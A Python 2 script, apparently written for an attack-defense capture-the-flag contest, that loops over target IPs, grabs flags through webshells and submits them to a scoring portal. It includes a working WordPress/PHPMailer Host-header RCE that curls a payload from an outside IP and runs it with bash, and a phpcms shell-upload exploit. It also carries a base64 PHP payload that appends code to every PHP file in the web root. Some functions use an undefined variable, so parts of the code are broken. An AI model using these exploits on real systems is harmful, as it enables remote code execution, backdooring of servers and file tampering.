#!/usr/bin/env python
import requests
import re
import time

req = None

TOKEN = ""
SUBMIT_URL = "http://192.168.80.1/lms/portal/sp/hz_flag.php"
SUBMIT_U = ""
SUBMIT_P = ""

URLS = ['40.10.10.57',
        '40.10.10.26',
        '40.10.10.11',
        '40.10.10.62',
        '40.10.10.47',
        '40.10.10.42',
        '40.10.10.15',
        ]


def poc(url):
    shellurl = url
    return shellurl


def poc_eval_backdoor_getflag_1(shellurl):
    data = {
        "s": evalcode
    }
    res = requests.post(shellurl, data=data, timeout=5)
    if res.status_code == 200:
        print res.content
        return res.content


def generate_command(command):
    command = '${run{%s}}' % command
    command = command.replace('/', '${substr{0}{1}{$spool_directory}}')
    command = command.replace(' ', '${substr{10}{1}{$tod_log}}')
    return 'target(any -froot@localhost -be %s null)' % command


def poc_wordpress_phpmail_rce_shell(url):
    target = 'http://{}'.format(url)
    shell_url = '115.159.196.171/rce.txt'
    user = 'admin'
    data = {
        'user_login': user,
        'redirect_to': '',
        'wp-submit': 'Get New Password'
    }
    headers = {
        'Host': generate_command('/usr/bin/curl -o /tmp/rce ' + shell_url),
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
    }
    target += '/wp-login.php?action=lostpassword'
    requests.post(target, headers=headers, data=data, allow_redirects=False)
    headers['Host'] = generate_command('/bin/bash /tmp/rce')
    requests.post(target, headers=headers, data=data, allow_redirects=False)


def poc_wordpress_phpmail_shell(url):
    shellpath = ''
    shellurl = ''
    target = 'http://{}'.format(url)
    shell_url = '115.159.196.171/shell.txt'
    user = 'admin'
    data = {
        'user_login': user,
        'redirect_to': '',
        'wp-submit': 'Get New Password'
    }
    headers = {
        'Host': generate_command('/usr/bin/curl -o ' + shellpath + ' ' + shell_url),
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
    }
    target += '/wp-login.php?action=lostpassword'
    requests.post(target, headers=headers, data=data, allow_redirects=False)
    return shellurl


def poc_phpcms_reg_shell(url):
    u = '{}/index.php?m=member&c=index&a=register&siteid=1'.format(url)
    data = {
        'siteid': '1',
        'modelid': '1',
        'username': 'test',
        'password': 'testxx',
        'email': 'test@test.com',
        'info[content]': '<img src=http://115.159.196.171/shell.txt?.php#.jpg>',
        'dosubmit': '1',
    }
    rep = requests.post(u, data=data)
    print(rep.content)
    shell = ''
    re_result = re.findall(r'&lt;img src=(.*)&gt', rep.content)
    if len(re_result):
        shell = re_result[0]
        return shell


def custom_shell_getflag(ip, evalcode=""):
    shellurl = 'http://{}/shell.php'.format(ip)
    if not evalcode:
        evalcode = "echo file_get_contents('/home/flag');"
    data = {
        "s": evalcode
    }
    res = requests.post(shellurl + "?v=virinkshell", data=data, timeout=5)
    if res.status_code == 200:
        print res.content
        return res.content


def custom_shell_add_shell(ip, ):
    shellurl = 'http://{}/shell.php'.format(ip)
    shellcode = custom_shell_code()
    code = "file_put_contents('/path/shell.php',base64_decode('{}'));".format(shellcode)
    data = {
        "s": evalcode
    }
    res = requests.post(shellurl + "?v=virinkshell", data=data, timeout=5)
    if res.status_code == 200:
        print res.content
        return res.content


def custom_shell_code():
    shell_code = "PD9waHAKc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwp1bmxpbmsoX19GSUxFX18pOwpmdW5jdGlvbiBnZXRmaWxlcygkcGF0aCl7CiAgICBmb3JlYWNoKGdsb2IoJHBhdGgpIGFzICRhZmlsZSl7CiAgICAgICAgaWYoaXNfZGlyKCRhZmlsZSkpCiAgICAgICAgICBnZXRmaWxlcygkYWZpbGUuJy8qLnBocCcpOwogICAgICAgIGVsc2UKICAgICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRhZmlsZSwnPD9waHAgZWNobyAiPj4+Ii5maWxlX2dldF9jb250ZW50KCIvcGF0aC9mbGFnIikuIjw8PCI7Pz4nLEZJTEVfQVBQRU5EKTsKICAgIH0KfQpnZXRmaWxlcygnL3Zhci93d3cvaHRtbCcpOwo/Pg=="
    return shell_code


def login():
    data = {
        "username": "HZ8",
        "password": "123456",
        "testcookie": "1",
        "indexPage": "portal/sp/index.php"
    }
    res = req.post('http://192.168.80.1/lms/portal/sp/login.php',
                   data=data, timeout=5)
    if res.status_code == 200:
        html = res.content
        print html


def submit(flag, ip):
    data = {
        "melee_flag": flag,
        "melee_ip": ip
    }
    res = req.post(SUBMIT_URL, data=data, timeout=5)
    if res.status_code == 200:
        print res.content


if __name__ == '__main__':
    # req = requests.session()
    # login()
    #
    req = requests.session()
    login()
    for ip in URLS:
        try:
            su = 'http://{}/index.php'.format(ip)
            flag = poc_eval_backdoor_getflag_1(su)
            print ip, flag
            submit(flag, ip)
            time.sleep(1)
        except Exception, e:
            print e
            pass
    time.sleep(60 * 20)
